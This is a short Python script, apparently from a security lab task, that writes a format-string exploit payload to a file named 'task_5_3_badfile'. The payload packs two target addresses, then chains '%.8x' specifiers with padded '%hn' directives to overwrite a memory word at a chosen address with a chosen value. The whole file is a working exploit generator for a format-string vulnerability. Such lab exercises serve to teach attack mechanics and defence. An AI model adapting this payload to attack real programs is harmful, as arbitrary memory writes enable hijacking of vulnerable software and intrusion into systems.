#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

LOWER_BYTES_NEW_VAL_DECIMAL = 0xFF99
HIGHER_BYTES_NEW_VAL_DECIMAL = 0x10000

target_address_lower_bytes = 0x080e5068
target_address_higher_bytes = 0x080e506A

content[0:4] = (target_address_higher_bytes).to_bytes(4, byteorder='little')
content[4:8] = b"@@@@"
content[8:12] = (target_address_lower_bytes).to_bytes(4, byteorder='little')

s = "%.8x" * 30
s += "%." + str(LOWER_BYTES_NEW_VAL_DECIMAL - 12 - 240) + "x" + "%hn"
s += "%." + str(HIGHER_BYTES_NEW_VAL_DECIMAL -
                LOWER_BYTES_NEW_VAL_DECIMAL) + "x" + "%hn"

fmt = (s).encode('latin-1')
content[12:12 + len(fmt)] = fmt

file = open("task_5_3_badfile", "wb")
file.write(content)
file.close()
